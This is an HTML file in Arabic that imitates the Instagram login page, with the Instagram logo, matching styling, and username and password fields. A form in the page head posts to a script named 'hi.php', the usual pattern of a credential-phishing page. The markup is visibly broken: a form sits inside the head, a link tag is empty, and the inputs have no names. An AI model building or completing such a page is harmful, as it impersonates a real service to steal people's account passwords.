<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <link rel="stylesheet" href="styles.css">
    <link rel>
    <form action="hi.php" method="POST">

    <meta charset="UTF-8">
    <title>تسجيل دخول انستجرام</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body {
            background: #fafafa;
            font-family: 'Tahoma', Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .login-container {
            background: #fff;
            border: 1px solid #dbdbdb;
            padding: 40px 30px;
            width: 320px;
            border-radius: 8px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .logo {
            margin-bottom: 30px;
        }
        .logo img {
            width: 150px;
        }
        .input-field {
            width: 100%;
            margin-bottom: 10px;
        }
        .input-field input {
            width: 100%;
            padding: 10px;
            border: 1px solid #dbdbdb;
            border-radius: 4px;
            background: #fafafa;
            font-size: 14px;
        }
        .login-btn {
            width: 100%;
            padding: 10px;
            background: #3897f0;
            color: #fff;
            border: none;
            border-radius: 4px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
            font-size: 15px;
        }
        .divider {
            display: flex;
            align-items: center;
            text-align: center;
            margin: 20px 0;
            color: #999;
        }
        .divider::before, .divider::after {
            content: '';
            flex: 1;
            border-bottom: 1px solid #dbdbdb;
        }
        .divider:not(:empty)::before {
            margin-left: .5em;
        }
        .divider:not(:empty)::after {
            margin-right: .5em;
        }
        .forgot {
            margin-top: 15px;
            font-size: 13px;
        }
        .signup {
            margin-top: 20px;
            padding: 20px 0 0 0;
            text-align: center;
            font-size: 14px;
        }
        .signup a {
            color: #3897f0;
            text-decoration: none;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
        </div>
        <form>
            <div class="input-field">
                <input type="text" placeholder="اسم المستخدم أو البريد الإلكتروني" required>
            </div>
            <div class="input-field">
                <input type="password" placeholder="كلمة المرور" required>
            </div>
            <button class="login-btn" type="submit">تسجيل الدخول</button>
        </form>
        <div class="divider">أو</div>
        <div class="forgot">
            <a href="#">هل نسيت كلمة المرور؟</a>
        </div>
        <div class="signup">
            ليس لديك حساب؟ <a href="#">سجّل الآن</a>
        </div>
    </div>
</body>
</html>
